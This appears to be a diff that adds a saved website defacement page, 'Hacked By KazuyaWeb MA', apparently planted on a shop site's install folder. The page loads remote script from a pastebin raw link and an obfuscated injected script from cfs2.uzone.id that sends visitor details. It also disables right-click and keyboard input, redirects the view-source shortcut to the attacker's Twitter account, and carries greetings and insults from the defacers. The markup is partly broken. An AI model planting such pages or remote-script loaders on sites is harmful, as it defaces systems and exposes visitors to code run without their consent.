@@ -1,4 +1,17 @@
-﻿<async="" src="http://cfs2.uzone.id/2fn7a2/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKZbcND574WOVPjg384%2bqoW%2fsj%2b0sKzPpCMDKQkEkB3OjiwV%2fFYOLAVZsGeSPcT7XkOXX5pjQ%2f36TNk%2fphL93hErsZKoIR74fgokF%2bfSdgrvRqkqWhWXFG%2f3%2bTiMbSjsXtnX2cvOFIbaz9E2MbakAriX0cajqK7ZJDqijpnRPegaYj4kD%2fwDIPOU%2fErYDxrGqUhfCdp7LeSWg8nMi0miHVY%2bKmiHSjbVan1N%2fpkYUr9hJ1K8vL%2bnkgwjrY8Voz5zL56QIKBuGZ1cwfLqUiNa9lFGY%2f4qf4WaM8i8FRy9nr0%2f15a6EwdEgjWN0mTtlhanw7Z2QlAQ%2fkRdLLf0%2btIaqfijCmXZnYt6%2bQVIV7aow84jEo0Dq6lNczg1zvJPy2aoSwIWUV8reZFImkyUdnPb9OoxWBlFAe4vdDYgtKLKzoJpeCSu8PtmZ7YyPE9Rf0DpPm8pRM4U8%2fd%2b8mvbRL88uJ3CPO%2frB6BEAn9u9FVOvS6aXLIKRSz3YyWCxm8PwXKJYCl0kdpISy2Ho%3d&amp;idc_r=625058114&amp;domain=maxshopper.net&amp;sw=1366&amp;sh=768"></script><link type="text/css" rel="stylesheet" charset="UTF-8" href="./Hacked By KazuyaWeb MA_files/translateelement.css"></head><body bgcolor="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
+
+<!-- saved from url=(0049)http://maxshopper.net//install/includes/KaiX.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta name="robots" content="index, follow">
+<meta name="description" content="Hacked by Kazuya">
+<link rel="SHORTCUT ICON" href="http://maxshopper.net//install/files.softicons.com/download/game-icons/mega-games-pack-38-icons-by-exhumed/ico/Prey_logo_1.ico" type="image/x-icon">
+<meta name="Hacked By KazuyaWeb MA" content="index,follow">
+<meta name="Hacked By KazuyaWeb MA" content="all">
+<meta name="Hacked By KazuyaWeb MA" content="auto">
+<meta name="distribution" content="global">
+<script src="https://pastebin.com/raw/1y9fjvLM"</script>
+<!--<base target="_blank">--><base href="." target="_blank">
+<link href="./Hacked By KazuyaWeb MA_files/css" rel="stylesheet">
+<script type="text/javascript" async="" src="http://cfs2.uzone.id/2fn7a2/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKZbcND574WOVPjg384%2bqoW%2fsj%2b0sKzPpCMDKQkEkB3OjiwV%2fFYOLAVZsGeSPcT7XkOXX5pjQ%2f36TNk%2fphL93hErsZKoIR74fgokF%2bfSdgrvRqkqWhWXFG%2f3%2bTiMbSjsXtnX2cvOFIbaz9E2MbakAriX0cajqK7ZJDqijpnRPegaYj4kD%2fwDIPOU%2fErYDxrGqUhfCdp7LeSWg8nMi0miHVY%2bKmiHSjbVan1N%2fpkYUr9hJ1K8vL%2bnkgwjrY8Voz5zL56QIKBuGZ1cwfLqUiNa9lFGY%2f4qf4WaM8i8FRy9nr0%2f15a6EwdEgjWN0mTtlhanw7Z2QlAQ%2fkRdLLf0%2btIaqfijCmXZnYt6%2bQVIV7aow84jEo0Dq6lNczg1zvJPy2aoSwIWUV8reZFImkyUdnPb9OoxWBlFAe4vdDYgtKLKzoJpeCSu8PtmZ7YyPE9Rf0DpPm8pRM4U8%2fd%2b8mvbRL88uJ3CPO%2frB6BEAn9u9FVOvS6aXLIKRSz3YyWCxm8PwXKJYCl0kdpISy2Ho%3d&amp;idc_r=625058114&amp;domain=maxshopper.net&amp;sw=1366&amp;sh=768"></script><link type="text/css" rel="stylesheet" charset="UTF-8" href="./Hacked By KazuyaWeb MA_files/translateelement.css"></head><body bgcolor="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
 
 <title>Hacked By KazuyaWeb MA </title>
 
@@ -83,7 +96,41 @@ window.onload=function() {
 
     for (x=0; x<rows; x++) {
 
-      +='<t'+'d class="matrix" id="Mx'+x+'y'+y+'"> </'+'td>';
+      ma_row=document.createElement("tr");
+
+      for (y=0; y<columns; y++) {
+
+        matemp=document.createElement("td");
+
+        matemp.setAttribute("id", "Mx"+x+"y"+y);
+
+        matemp.className="matrix";
+
+        matemp.appendChild(document.createTextNode(String.fromCharCode(160)));
+
+        ma_row.appendChild(matemp);
+
+      }
+
+      ma_bod.appendChild(ma_row);
+
+    }
+
+    ma_tab.appendChild(ma_bod);
+
+    matrix.appendChild(ma_tab);
+
+  } else {
+
+    ma_tab='<ta'+'ble align="'+effectalign+'" border="0" style="background-color:#000000">';
+
+    for (var x=0; x<rows; x++) {
+
+      ma_tab+='<t'+'r>';
+
+      for (var y=0; y<columns; y++) {
+
+        ma_tab+='<t'+'d class="matrix" id="Mx'+x+'y'+y+'"> </'+'td>';
 
       }
 
@@ -91,7 +138,47 @@ window.onload=function() {
 
     }
 
-    firstChild.nodeValue=m_coch[y];
+    ma_tab+='</'+'table>';
+
+    matrix.innerHTML=ma_tab;
+
+  }
+
+  ma_cho=ma_txt;
+
+  for (x=0; x<columns; x++) {
+
+    ma_cho+=String.fromCharCode(32+Math.floor(Math.random()*94));
+
+    m_copo[x]=0;
+
+  }
+
+  ma_bod=setInterval("mytricks()", speed);
+
+}
+
+
+
+function mytricks() {
+
+  x=0;
+
+  for (y=0; y<columns; y++) {
+
+    x=x+(m_copo[y]==100);
+
+    ma_row=m_copo[y]%100;
+
+    if (ma_row && m_copo[y]<100) {
+
+      if (ma_row<rows+1) {
+
+        if (w3c) {
+
+          matemp=document.getElementById("Mx"+(ma_row-1)+"y"+y);
+
+          matemp.firstChild.nodeValue=m_coch[y];
 
         }
 
@@ -327,4 +414,95 @@ setInterval(flicker, 100);
 <div style="text-align:center;font-family:Orbitron;"><h1><span class="neon">/</span><span class="neon">!</span><span class="neon">\</span><span class="neon"> &gt; </span><span class="neon">H</span><span class="neon">A</span><span class="neon">C</span><span class="neon">K</span><span class="neon">E</span><span class="neon">D</span><span class="neon"> </span><span class="neon">B</span><span class="neon">Y</span><span class="neon"> </span><span class="neon">K</span><span class="neon">a</span><span class="neon">z</span><span class="neon">u</span><span class="neon">y</span><span class="neon">a</span><span class="neon">W</span><span class="neon">e</span><span class="neon">b</span><span class="neon"> </span><span class="neon">M</span><span class="neon">A</span><span class="neon"> &lt; </span><span class="neon">/</span><span class="neon">!</span><span class="neon">\</span></h1>
 </div>
 
-<div id="matrix" class="auto-style8"><table border="0" align="center" style="background-color: rgb(0, 0, 0);"><tbody><tr><td id="Mx0y0" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">S</td><td id="Mx0y1" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">e</td><td id="Mx0y2" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">c</td><td id="Mx0y3" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">u</td><td id="Mx0y4" class="matrix" style="color: rgb(0, 187, 255); font-weight: normal;">r</td><td id="Mx0y5" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">i</td><td id="Mx0y6" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">t</td><td id="Mx0y7" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">y</td><td id="Mx0y8" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;"> </td><td id="Mx0y8" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">V</td><td id="Mx0y9" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">a</td><td id="Mx0y10" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">l</td><td id="Mx0y11" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">u</td><td id="Mx0y12" class="matrix" style="color: rgb(91, 238, 255); 
+<div id="matrix" class="auto-style8"><table border="0" align="center" style="background-color: rgb(0, 0, 0);"><tbody><tr><td id="Mx0y0" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">S</td><td id="Mx0y1" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">e</td><td id="Mx0y2" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">c</td><td id="Mx0y3" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">u</td><td id="Mx0y4" class="matrix" style="color: rgb(0, 187, 255); font-weight: normal;">r</td><td id="Mx0y5" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">i</td><td id="Mx0y6" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">t</td><td id="Mx0y7" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">y</td><td id="Mx0y8" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;"> </td><td id="Mx0y8" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">V</td><td id="Mx0y9" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">a</td><td id="Mx0y10" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">l</td><td id="Mx0y11" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">u</td><td id="Mx0y12" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">e</td><td id="Mx0y13" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;"> </td><td id="Mx0y14" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;"> 0</td><td id="Mx0y15" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">x</td><td id="Mx0y16" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">0</td><td id="Mx0y17" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">0</td><td id="Mx0y18" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;"> _</td><td id="Mx0y19" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;"> B</td><td id="Mx0y20" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">r</td><td id="Mx0y21" class="matrix" style="color: rgb(32, 255, 218); font-weight: normal;">c</td><td id="Mx0y22" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;">h</td><td id="Mx0y23" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;"> &lt; </td><td id="Mx0y24" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;"> &gt; </td><td id="Mx0y25" class="matrix" style="color: rgb(91, 238, 255); font-weight: bold;"> </td></tr></tbody></table></div><br>
+<font face="courier new" color="red" size"5"="">Greats: <font face="courier new" color="white" size"5"="">Xepher | Azair| Kurosaki | Asahi | TSU | 12 62 | HuKaZ | KazuSec| Kayzo <br> And all <font face="courier new" color="cyan" size"5"="">212Rocma <br><font face="courier new" color="red" size"5"=""> Fuck: <font face="courier new" color="white" size"5"="">All noob from from discord and all Xbox Modders.
+
+
+<center>
+
+<hr width="550px" style="color:red;">
+<link href="./Hacked By KazuyaWeb MA_files/css(1)" rel="stylesheet" type="text/css">
+<font face="courier new" color="white" size"5"="">The media make us believe what they want.<br>Whoever can influence the world through speech holds absolute power<br><br>
+
+</font><center><font face="courier new" color="white" size"5"=""><a href="https://twitter.com/Kais212Maroc?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-show-count="false">Follow @Kais212Maroc</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<center>
+<span style="font: 15px Lucida Handwriting;size:15px;color:cyan;text-shadow: 0px 0px 50px;"><strong>
+<style type="text/css">
+<span style='font: 100px>
+ body{
+  font-family: Trebuchet MS, Lucida Sans Unicode, Arial, sans-serif;
+  margin-top:0px;
+   background-repeat:no-repeat;
+  padding-top:26px;
+ }
+    #myContent, #myContent blink{
+        width:0%px;
+        height:0%px;
+        background:black;
+        color: #00FFFF;
+        font-family:IceLand;
+        font-size:20px;
+    }
+    blink{
+        display:inline;
+    }
+    </style><br>
+    <script type="text/javascript">
+  var charIndex = -1;
+    var stringLength = 0;
+    var inputText;
+    function writeContent(init){
+     if(init){
+      inputText = document.getElementById('contentToWrite').innerHTML;
+     }
+        if(charIndex==-1){
+            charIndex = 0;
+            stringLength = inputText.length;
+        }
+        var initString = document.getElementById('myContent').innerHTML;
+  initString = initString.replace(/<SPAN.*$/gi,"");
+
+        var theChar = inputText.charAt(charIndex);
+        var nextFourChars = inputText.substr(charIndex,4);
+        if(nextFourChars=='<br>' || nextFourChars=='<br>'){
+         theChar  = '<br>';
+         charIndex+=3;
+        }
+        initString = initString + theChar + "<span id='blink'>_</SPAN>";
+        document.getElementById('myContent').innerHTML = initString;
+
+        charIndex = charIndex/1 +1;
+  if(charIndex%2==1){
+             document.getElementById('blink').style.display='font: 100px';
+        }else{
+             document.getElementById('blink').style.display='inline';
+        }
+
+        if(charIndex<=stringLength){
+            setTimeout('writeContent(false)',100);
+        }else{
+         blinkSpan();
+        }
+    }
+        var currentStyle = 'inline';
+    function blinkSpan(){
+     if(currentStyle=='inline'){
+      currentStyle='none';
+     }else{
+      currentStyle='inline';
+     }
+     document.getElementById('blink').style.display = currentStyle;
+     setTimeout('blinkSpan()',9999999);
+
+    }
+    </script>
+<!-- --------Cursor--------- -->
+<style type="text/css">body, a, a:link{cursor:url(http://diabras.com/4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), default;} a:hover {cursor:url(http://diabras.com/3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),wait;}</style>
+<embed src="https://c.top4top.net/m_1121g82zl1.mp3" autostart="true" loop="true" height="0" width="0">
+<script src="./Hacked By KazuyaWeb MA_files/jquery.min.js.téléchargement" type="text/javascript"> </script> <script type="text/javascript">$(document).ready(function() {$(".facebookbox").hover(function() {$(this).stop().animate({right: "0"}, "medium");}, function() {$(this).stop().animate({right: "-250"}, "medium");}, 500);}); </script><style type="text/css"> .facebookbox{background: url("http://www.mjcgex.fr/squelettes/IMG/facebook-bouton.png") no-repeat scroll left center transparent !important;display: block;float: right;height: 270px;padding: 0 5px 0 46px;width: 245px;z-index: 99999;position:fixed;right:-250px;top:40%;} .facebookbox div{border:none;position:relative;display:block;} .facebookbox span{bottom: 12px;font: 8px "lucida grande",tahoma,verdana,arial,sans-serif;position: absolute;right: 6px;text-align: right;z-index: 99999;} .facebookbox span a{color: #808080;text-decoration:none;} .facebookbox span a:hover{text-decoration:underline;}</style><div class="facebookbox" style="right: -250px;"> <iframe scrolling="no" frameborder="0" style="border: medium none; overflow: hidden; height: 270px; width: 245px;background:#fff;" src="./Hacked By KazuyaWeb MA_files/likebox.html"></iframe></div>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKZbcND574WOVPjg384%2bqoW%2fsj%2b0sKzPpCMDKQkEkB3OjiwV%2fFYOLAVZsGeSPcT7XkOXX5pjQ%2f36TNk%2fphL93hErsZKoIR74fgokF%2bfSdgrvRqkqWhWXFG%2f3%2bTiMbSjsXtnX2cvOFIbaz9E2MbakAriX0cajqK7ZJDqijpnRPegaYj4kD%2fwDIPOU%2fErYDxrGqUhfCdp7LeSWg8nMi0miHVY%2bKmiHSjbVan1N%2fpkYUr9hJ1K8vL%2bnkgwjrY8Voz5zL56QIKBuGZ1cwfLqUiNa9lFGY%2f4qf4WaM8i8FRy9nr0%2f15a6EwdEgjWN0mTtlhanw7Z2QlAQ%2fkRdLLf0%2btIaqfijCmXZnYt6%2bQVIV7aow84jEo0Dq6lNczg1zvJPy2aoSwIWUV8reZFImkyUdnPb9OoxWBlFAe4vdDYgtKLKzoJpeCSu8PtmZ7YyPE9Rf0DpPm8pRM4U8%2fd%2b8mvbRL88uJ3CPO%2frB6BEAn9u9FVOvS6aXLIKRSz3YyWCxm8PwXKJYCl0kdpISy2Ho%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+<script type="text/javascript">shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="https://twitter.com/kais212Maroc"});
+</script>
+</strong></span></center></font></center></center>
+</font></font></font></font></font></center></center></body></html>
